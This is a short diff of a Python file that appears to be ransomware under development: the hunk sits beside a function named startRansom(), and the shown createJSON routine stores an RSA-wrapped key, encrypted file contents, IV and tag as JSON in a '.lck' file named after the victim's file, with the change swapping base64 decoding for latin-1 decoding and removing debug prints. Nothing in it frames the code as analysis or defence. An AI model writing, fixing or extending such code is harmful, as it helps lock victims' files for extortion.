@@ -191,20 +191,15 @@ def startRansom():
 
 # Create a JSON file
 def createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt):
-	print("JSONRSA")
-	print(RSACipher)
-	print("decoded")
-	print(len(RSACipher))
-	print(base64.b64decode(RSACipher))
-
 	name, ext = os.path.splitext(fileName)
 	data = {}
 	data['fileName'] = 		name
-	data['RSACipher'] = 	base64.b64decode(RSACipher)
-	data['cipherFile'] =	base64.b64decode(cipherFile)
-	data['iv'] = 			base64.b64decode(iv)
-	data['tag'] = 			base64.b64decode(tag)
-	data['fileExt'] = fileExt
+	data['cipherFile'] =	(cipherFile.decode('latin-1'))
+	data['RSACipher'] = 	(RSACipher.decode('latin-1'))
+	data['iv'] = 			(iv.decode('latin-1'))
+	data['tag'] = 			(tag.decode('latin-1'))
+	data['fileExt'] = 		fileExt
+
 	with open(fileName.rsplit(".", 1)[0] + '.lck', 'w') as file:
 		file.write(json.dumps(data, indent=constants.CONST_INDENT_SIZE))
 		file.close()
